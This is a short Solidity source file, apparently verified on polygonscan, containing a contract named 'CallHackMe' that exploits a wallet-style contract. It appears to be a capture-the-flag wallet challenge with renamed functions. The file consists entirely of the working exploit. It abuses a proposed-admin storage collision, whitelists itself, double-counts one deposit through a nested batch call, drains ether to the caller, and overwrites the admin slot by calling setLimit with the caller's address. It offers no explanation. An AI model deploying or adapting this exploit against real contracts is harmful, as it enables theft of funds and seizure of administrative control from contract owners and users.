/**
 *Submitted for verification at polygonscan.com on 2023-05-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

// import "hardhat/console.sol";

interface BeaconAUniSwap {
    function setLimit(uint256 _maxBalance) external;

    function initializeContract(uint256 _maxBalance) external;

    function addEth() external payable;

    function addToWL(address addr) external;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function batchAll(bytes[] calldata data) external payable;

    function proposeBeacon(address _newAdmin) external;

    function approveBeacon(address _expectedAdmin) external;
}

contract CallHackMe {
    function callBeacon(BeaconAUniSwap beaconContract) public payable {
        beaconContract.proposeBeacon(address(this));
        beaconContract.addToWL(address(this));
        bytes[] memory datum1 = new bytes[](1);
        datum1[0] = abi.encodeWithSignature("addEth()");

        bytes[] memory data = new bytes[](2);
        data[0] = datum1[0];
        data[1] = abi.encodeWithSignature("batchAll(bytes[])", datum1);
        beaconContract.batchAll{value: 0.001 ether}(data);
        beaconContract.execute(address(msg.sender), 0.002 ether, "");
        beaconContract.setLimit(uint256(uint160(msg.sender)));
    }
}